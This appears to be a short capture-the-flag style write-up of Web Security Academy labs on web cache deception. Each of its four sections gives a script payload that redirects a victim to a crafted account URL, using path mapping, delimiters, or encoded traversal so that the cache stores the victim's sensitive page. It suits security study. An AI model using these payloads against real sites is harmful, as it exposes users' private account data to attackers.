### Exploiting path mapping for web cache deception
**Payload** :
```html
<script>document.location="https://0ac50000045154f78596359e003300d8.web-security-academy.net/my-account/aaaa.js"</script>
```
Deliver exploit to victim
When it deliver to victim, it will caching the content, which contain sensitive information. then when we access the url, it will return sensitive information of victim

### Exploiting path delimiters for web cache deception
**Payload** :
```html
<script>document.location="https://0aed006e0379eaca80330d6c00ad00d9.web-security-academy.net/my-account;aaaa.js"</script>
```
Deliver exploit to victim
on cache mechanism and backend server have different way on read URL, while cache mechanism read that as static file, but backend system read that just an add-on

### Exploiting origin server normalization for web cache deception
**Payload** :
```html
<script>document.location="https://0a2d003a04fb43308387dccb0044007f.web-security-academy.net/resources/..%2fmy-account"</script>
```
Deliver exploit to victim
on this case, cache mechanism will save cache if the path start with /resources, and since it also have path traversal vulnerabilities, it can go back to path /my-account

### Exploiting cache server normalization for web cache deception
**Payload** :
```html
<script>document.location="https://0a9000680374776b80eb1246005e00c5.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?asd"</script>
```
Deliver exploit to victim
It happen, when cache mechanism see the url as /resources, while backend see the url as /my-account, it can happen since there's delimiter %23 (#)